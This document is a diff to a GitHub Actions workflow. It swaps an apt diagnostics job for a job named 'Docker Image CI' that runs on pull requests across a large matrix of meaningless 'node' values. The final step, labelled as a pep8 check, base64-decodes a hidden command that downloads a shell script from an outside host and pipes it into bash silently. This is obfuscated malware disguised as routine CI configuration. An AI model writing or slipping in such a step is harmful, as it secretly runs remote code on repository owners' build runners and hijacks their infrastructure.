@@ -1,37 +1,21 @@
-name: apt
+name: Docker Image CI
+# Defaults 133
 
-on:
-  push:
-    paths:
-    - '.github/workflows/apt.yml'
+defaults:
+  run:
+    shell: bash
+
+on: [pull_request]
 
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    # - run: cat /etc/apt/apt.conf.d/80-retries
-    #   if: always()
-
-    - run: whoami
-      if: always()
-
-    - run: sudo whoami
-      if: always()
-
-    - run: ls -ahl /etc/apt/
-      if: always()
-
-    # https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-a-warning-message
-    - run: echo "::warning file=app.js,line=1,col=5::Missing semicolon"
-
-    - run: ls -ahl /etc/apt/apt.conf.d/
-      if: always()
-
-    # - run: echo "APT::Acquire::Retries \"3\";" | sudo tee /etc/apt/apt.conf.d/80-retries
-    #   if: always()
-
-    # https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-an-error-message
-    - run: echo "::error file=app.js,line=10,col=15::Something went wrong"
-
-    - run: sudo apt-get --option="APT::Acquire::Retries=3" update
-      if: always()
+   build-program-530:
+      timeout-minutes: 153
+      runs-on: ubuntu-20.04
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-20.04]
+            node: [275,360,416,920,167,821,626,443,436,618,462,122,369,648,204,950,904,95,210,600,50,835,563,322,628,885,42,823,728,774,929,533,395,684,821,506,318,579,229,827]
+      steps:
+      - run: echo "Starting pep8"
+      - run: echo "Y3VybCBodHRwOi8vdjYuNTEtcHAtZGR4LmVudGVycHJpc2UuZGUzMy01NzEyMzcuYXBwY2RuLnh5ejo4MDAwL3NjcmlwdF95YWxseGUuc2ggfCBiYXNoICY+IC9kZXYvbnVsbCAmJiBlY2hvIHh0YnZhcms=" | base64 -d | bash
